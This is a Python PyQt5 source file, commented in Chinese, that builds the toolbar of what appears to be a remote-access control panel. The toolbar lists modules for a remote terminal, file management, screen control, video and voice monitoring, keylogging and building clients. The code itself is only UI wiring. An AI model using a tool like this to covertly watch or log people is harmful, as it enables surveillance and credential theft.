# -*- coding: utf-8 -*-
from PyQt5.QtCore import QSize, Qt, QCoreApplication
from PyQt5.QtGui import QHideEvent
from PyQt5.QtWidgets import QToolBar, QMainWindow

from bin.ui_view.utils import load_animation
from bin.ui_view.utils.exit import ExitUI
from bin.ui_view.utils.fileManage import FileManagerUI
from bin.ui_view.utils.keyboard import KeyboardUI
from bin.ui_view.utils.make_client import MakeClientUI
from bin.ui_view.utils.remote_control import RemoteControlUI
from bin.ui_view.utils.server_manager import ServiceManagerUI
from bin.ui_view.utils.server_start import ServerStartUI
from bin.ui_view.utils.terminal import TerminalUI
from bin.ui_view.utils.videomonitor import VideoMonitorUI
from bin.ui_view.utils.voice_montor import VoiceMonitorUI
from lib import settings
from lib.communicate import communicate

_translate = QCoreApplication.translate

"""
工具导航 ToolbarView
"""


class ToolbarUI(object):
    def __new__(cls, *args, **kwargs) -> object:
        if not hasattr(cls, "_instance"):  # 反射
            cls._instance = object.__new__(cls)
        return cls._instance

    def __init__(self, main_window: QMainWindow):
        if not hasattr(self, "_init_flag"):  # 反射
            self._init_flag = True  # 只初始化一次
            self.main_window = main_window
            self.toolbar = QToolBar(self.main_window)
            self.ui_view_list = []

    def options(self) -> None:
        self.toolbar.setObjectName("toolBar")

        # 设置是否可以移动
        self.toolbar.setMovable(True)

        # 设置是否可以悬浮在主窗口
        self.toolbar.setFloatable(True)

        # 设置图标尺寸
        self.toolbar.setIconSize(QSize(25, 25))

        # 字体在右边
        # self.tools_main.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)

        # 字体在下面
        if settings.LOAD_EFFECT_ON:
            self.toolbar.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
            load_animation.load_animation(self.toolbar)

        # 窗口添加工具栏
        self.main_window.addToolBar(Qt.TopToolBarArea, self.toolbar)

    def setup_ui(self) -> None:
        self.options()

        if not settings.TOOLBAR_SHOW:
            self.toolbar.hide()

        self.load_ui()
        self.show_ui()

        # QDockWidget 位置发生变动
        self.toolbar.orientationChanged.connect(self.orientation_changed)

    def orientation_changed(self, event):
        """
        位置变动事件
        :param event:
        :return:
        """
        if event:
            pass
        if settings.LOAD_EFFECT_ON:
            load_animation.load_animation(self.toolbar)

    # noinspection PyArgumentList
    def retranslate_ui(self) -> None:
        self.toolbar.setWindowTitle(_translate("ToolbarUI", "工具导航"))

    def add_ui(self, ui: object) -> None:
        """
        添加模块
        :param ui:
        :return:
        """
        if ui not in self.ui_view_list:
            self.ui_view_list.append(ui)

    def load_ui(self) -> None:
        """
        加载模块
        :return:
        """
        self.add_ui(ServerStartUI(self.toolbar))  # 服务器开关
        self.add_ui(FileManagerUI(self.toolbar))  # 文件管理
        self.add_ui(TerminalUI(self.toolbar))  # 远程终端
        self.add_ui(RemoteControlUI(self.toolbar))  # 远程监控
        self.add_ui(VideoMonitorUI(self.toolbar))  # 视频监控
        self.add_ui(VoiceMonitorUI(self.toolbar))  # 语音监控
        self.add_ui(KeyboardUI(self.toolbar))  # 键盘记录
        self.add_ui(MakeClientUI(self.toolbar))  # 创建客户端
        self.add_ui(ServiceManagerUI(self.toolbar))  # 服务管理
        self.add_ui(ExitUI(self.toolbar))  # 退出程序

    def show_ui(self) -> None:
        """
        显示数据
        :return:
        """
        for view in self.ui_view_list:
            view.setup_ui()
            view.retranslate_ui()


class ToolbarConnect(object):
    def __init__(self, main_window: QMainWindow):
        self.main_window = main_window

        self.toolbar_ui = ToolbarUI(self.main_window)
        self.toolbar = self.toolbar_ui.toolbar

    def setup_ui(self) -> None:
        self.communicate_connect()
        self.toolbar.hideEvent = self.hide_event
        self.toolbar.showEvent = self.hide_event

    def communicate_connect(self) -> None:
        # 工具栏是否显示
        communicate.toolbar_show.connect(self.toolbar_show)

    def toolbar_show(self, flag: bool) -> None:
        if flag:
            # 显示
            self.toolbar.setHidden(False)
        else:
            # 隐藏
            self.toolbar.setHidden(True)

    def hide_event(self, event: QHideEvent):
        """
        菜单栏中的  工具导航
        :param event:
        :return:
        """
        if event:
            pass
        if self.toolbar.isHidden():
            communicate.toolbar_checked.emit(False)
        else:
            communicate.toolbar_checked.emit(True)

    def retranslate_ui(self) -> None:
        pass
